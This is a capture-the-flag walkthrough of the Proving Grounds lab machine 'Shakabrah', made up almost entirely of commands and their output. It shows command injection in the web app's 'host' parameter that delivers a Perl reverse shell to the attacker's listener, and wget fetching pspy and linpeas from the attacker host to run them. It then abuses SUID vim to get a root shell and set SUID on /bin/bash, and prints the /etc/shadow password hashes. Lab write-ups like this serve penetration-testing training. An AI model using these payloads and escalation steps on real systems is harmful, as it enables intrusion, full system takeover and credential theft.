# Recon

```console
root@kali:/OSCPv3/offsec_pg/Shakabrah# nmap -Pn -sT -sV -n 192.168.61.86 -p- --min-rate 1000 --max-retries 2
Starting Nmap 7.70 ( https://nmap.org ) at 2021-11-30 17:39 CST
Nmap scan report for 192.168.61.86
Host is up (0.10s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 131.73 seconds
``` 

## HTTP TCP/80

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Shakabrah/img/1.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Shakabrah/img/2.png)

# Explotation

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Shakabrah/img/3.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Shakabrah/img/4.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Shakabrah/img/5.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Shakabrah/img/6.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Shakabrah/img/7.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Shakabrah/img/8.png)


```console
root@kali:/OSCPv3/offsec_pg/Shakabrah# nc -lvnp 80
listening on [any] 80 ...
connect to [192.168.49.61] from (UNKNOWN) [192.168.61.86] 50088
```

```shell
http://192.168.61.86/?host=;echo%20%27use%20Socket;$i=%22192.168.49.61%22;$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname(%22tcp%22));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,%22%3E%26S%22);open(STDOUT,%22%3E%26S%22);open(STDERR,%22%3E%26S%22);exec(%22/bin/sh%20-i%22);};%27
```

```shell
http://192.168.61.86/?host=;perl -e %20%27use%20Socket;$i=%22192.168.49.61%22;$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname(%22tcp%22));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,%22%3E%26S%22);open(STDOUT,%22%3E%26S%22);open(STDERR,%22%3E%26S%22);exec(%22/bin/sh%20-i%22);};%27
```

```console
root@kali:/OSCPv3/offsec_pg/Shakabrah# nc -lvnp 80
listening on [any] 80 ...
connect to [192.168.49.61] from (UNKNOWN) [192.168.61.86] 50090
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ script /dev/null -c bash
Script started, file is /dev/null
www-data@shakabrah:/var/www/html$ ^Z
[1]+  Detenido                nc -lvnp 80
root@kali:/OSCPv3/offsec_pg/Shakabrah# stty raw -echo
root@kali:/OSCPv3/offsec_pg/Shakabrah# nc -lvnp 80
                                                  reset
reset: unknown terminal type unknown
Terminal type? xterm

www-data@shakabrah:/var/www/html$ export TERM=xterm
www-data@shakabrah:/var/www/html$ export SHELL=bash
www-data@shakabrah:/var/www/html$ stty rows 29 columns 129 
```

```console
www-data@shakabrah:/var/www$ find / -name local.txt 2>/dev/null
/home/dylan/local.txt
``` 

```console
www-data@shakabrah:/var/www$ cat /home/dylan/local.txt
c170d6d7c95561fd99cc0516606b7dbf
``` 

# Privilege escalation

```console
www-data@shakabrah:/home/dylan$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
dylan:x:1000:1000:dylan,,,:/home/dylan:/bin/bash
``` 

```console
www-data@shakabrah:/home/dylan$ ls -la /etc/passwd
-rw-r--r-- 1 root root 1561 Aug 25  2020 /etc/passwd
www-data@shakabrah:/home/dylan$ ls -la /etc/shadow
-rw-r----- 1 root shadow 1025 Aug 25  2020 /etc/shadow
```

```console
www-data@shakabrah:/home/dylan$ sudo -l
[sudo] password for www-data: 
Sorry, try again.
[sudo] password for www-data: 
Sorry, try again.
[sudo] password for www-data: 
sudo: 3 incorrect password attempts
```

```console
www-data@shakabrah:/home/dylan$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/traceroute6.iputils
/usr/bin/at
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/newgidmap
/usr/bin/vim.basic
/usr/bin/newuidmap
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/bin/umount
/bin/fusermount
/bin/ping
/bin/mount
/bin/su
```

```console
www-data@shakabrah:/home/dylan$ getcap -r  / 2 2>/dev/null
/usr/bin/mtr-packet = cap_net_raw+ep
``` 

```console
www-data@shakabrah:/tmp$ wget http://192.168.49.61/pspy64s
--2021-11-30 19:36:09--  http://192.168.49.61/pspy64s
Connecting to 192.168.49.61:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1156536 (1.1M) [application/octet-stream]
Saving to: 'pspy64s'

pspy64s                          100%[=======================================================>]   1.10M   413KB/s    in 2.7s    

2021-11-30 19:36:12 (413 KB/s) - 'pspy64s' saved [1156536/1156536]

``` 

```console
www-data@shakabrah:/tmp$ ls
pspy64s
www-data@shakabrah:/tmp$ chmod +x pspy64s 
www-data@shakabrah:/tmp$ ./pspy64s 

pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2021/11/30 19:36:49 CMD: UID=33   PID=962    | /usr/sbin/apache2 -k start 
2021/11/30 19:36:49 CMD: UID=33   PID=961    | /usr/sbin/apache2 -k start 
2021/11/30 19:36:49 CMD: UID=33   PID=960    | /usr/sbin/apache2 -k start 
2021/11/30 19:36:49 CMD: UID=33   PID=959    | /usr/sbin/apache2 -k start 
2021/11/30 19:36:49 CMD: UID=33   PID=958    | /usr/sbin/apache2 -k start 
2021/11/30 19:36:49 CMD: UID=0    PID=940    | /usr/sbin/apache2 -k start 
2021/11/30 19:36:49 CMD: UID=0    PID=910    | /usr/sbin/sshd -D 
2021/11/30 19:36:49 CMD: UID=0    PID=9      | 
....
....
```


```console
www-data@shakabrah:/tmp$ wget http://192.168.49.61/linpeas.sh
--2021-11-30 19:39:40--  http://192.168.49.61/linpeas.sh
Connecting to 192.168.49.61:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 634071 (619K) [text/x-sh]
Saving to: 'linpeas.sh'

linpeas.sh                       100%[=======================================================>] 619.21K   501KB/s    in 1.2s    

2021-11-30 19:39:41 (501 KB/s) - 'linpeas.sh' saved [634071/634071]

www-data@shakabrah:/tmp$ chmod +x linpeas.sh 
```

```console
www-data@shakabrah:/tmp$ ./linpeas.sh > linpeas.txt
.....
.....
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits
Linux version 4.15.0-112-generic (buildd@lcy01-amd64-027) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #113-Ubuntu SMP Th
u Jul 9 23:41:39 UTC 2020
Distributor ID:	Ubuntu
Description:	Ubuntu 18.04.5 LTS
Release:	18.04
Codename:	bionic
....
....

══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester

Available information:

Kernel version: 4.15.0
Architecture: x86_64
Distribution: ubuntu
Distribution version: 18.04
Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performed
Package listing: from current OS

passwd file: /etc/pam.d/passwd
passwd file: /etc/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd

```

```console
www-data@shakabrah:/var/www/html$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/traceroute6.iputils
/usr/bin/at
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/newgidmap
/usr/bin/vim.basic
/usr/bin/newuidmap
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/bin/umount
/bin/fusermount
/bin/ping
/bin/mount
/bin/su
```

```console
www-data@shakabrah:/var/www/html$ vim.basic /root/proof.txt
13a80072527261f02fc19e5d253d42aa
```

```shell
root:$6$CW1vQfHn$5CwQMcQkqLcemnHbbejgdHCw3upr9gRwt/mj93i2ZmKJ31iAFDQKcX8MHVMPhjFVaFwDzAEeDpPtGxnIQRqx..:18499:0:99999:7:::
daemon:*:17647:0:99999:7:::
bin:*:17647:0:99999:7:::
sys:*:17647:0:99999:7:::
sync:*:17647:0:99999:7:::
games:*:17647:0:99999:7:::
man:*:17647:0:99999:7:::
lp:*:17647:0:99999:7:::
mail:*:17647:0:99999:7:::
news:*:17647:0:99999:7:::
uucp:*:17647:0:99999:7:::
proxy:*:17647:0:99999:7:::
www-data:*:17647:0:99999:7:::
backup:*:17647:0:99999:7:::
list:*:17647:0:99999:7:::
irc:*:17647:0:99999:7:::
gnats:*:17647:0:99999:7:::
nobody:*:17647:0:99999:7:::
systemd-network:*:17647:0:99999:7:::
systemd-resolve:*:17647:0:99999:7:::
syslog:*:17647:0:99999:7:::
messagebus:*:17647:0:99999:7:::
_apt:*:17647:0:99999:7:::
lxd:*:18499:0:99999:7:::
uuidd:*:18499:0:99999:7:::
dnsmasq:*:18499:0:99999:7:::
landscape:*:18499:0:99999:7:::
sshd:*:18499:0:99999:7:::
pollinate:*:18499:0:99999:7:::
dylan:$6$ZNHlGil5$uaLB8HbfxC6H.7S71bfaa.rTsFnO55Lw2XATYf1m9OF4szIFyUbWmqzn1hGSLb7kbjxrLRFbNfm7LtBOYTOaA0:18499:0:99999:7:::
```

```console
www-data@shakabrah:/tmp$ cat linpeas.txt | grep python
root       609  0.0  1.6 169100 17132 ?        Ssl  18:34   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root       655  0.0  1.9 185944 19976 ?        Ssl  18:34   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
lrwxrwxrwx 1 root root       9 Oct 25  2018 /usr/bin/python3 -> python3.6
-rw-r--r-- 1 root root 1397 Aug 25  2020 /usr/share/sosreport/sos/plugins/__pycache__/ovirt_engine_backup.cpython-36.pyc
/usr/lib/python3/dist-packages/twisted/cred/__pycache__/credentials.cpython-36.pyc
/usr/lib/python3/dist-packages/twisted/cred/credentials.py
``` 

```console
www-data@shakabrah:/var/www/html$ /usr/bin/vim.basic -c ':py3 import os; os.execl("/bin/bash", "bash", "-pc", "reset; exec bash -p")'

bash-4.4# whoami
root
bash-4.4# cd /root/
bash-4.4# ls -la
total 20
drwx------  2 root root 4096 Nov 30 20:19 .
drwxr-xr-x 23 root root 4096 Aug 25  2020 ..
lrwxrwxrwx  1 root root    9 Aug 25  2020 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-------  1 root root   33 Nov 30 18:37 proof.txt
bash-4.4# cat proof.txt
13a80072527261f02fc19e5d253d42aa
``` 

```console
www-data@shakabrah:/var/www/html$ www-data@shakabrah:/var/www/html$ /usr/bin/vim.basic -c ':py3 import os; os.execl("/bin/bash", "bash", "-pc", "reset; chmod u+s /bin/bash")'

www-data@shakabrah:/var/www/html$ ls -la /bin/bash 
-rwsr-xr-x 1 root root 1113504 Jun  6  2019 /bin/bash
www-data@shakabrah:/var/www/html$ bash -p
bash-4.4# whoami
root
bash-4.4# 
```
